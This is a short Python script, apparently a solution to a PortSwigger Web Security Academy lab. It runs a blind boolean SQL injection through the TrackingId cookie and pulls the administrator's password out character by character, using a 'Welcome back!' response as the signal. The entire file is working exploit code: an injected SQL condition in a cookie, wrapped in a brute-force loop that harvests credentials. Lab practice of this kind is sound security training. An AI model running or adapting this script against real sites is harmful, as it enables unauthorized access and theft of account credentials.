import requests;

password=""
url="https://0a2a009103c2c87782ef0681007200c8.web-security-academy.net/filter?category=Pets"
payload= "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.,?!:;()""[]{}_"
for i in range(1,30):
    for c in payload:
        cookies = {
            "TrackingId": f"<current cookie>' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{c}' -- ",
            "session": "<current cookie>"
        }
        response=requests.get(url,cookies=cookies)
        if "Welcome back!" in response.text:
            password+=c
            print("Flag: ",password)
            break

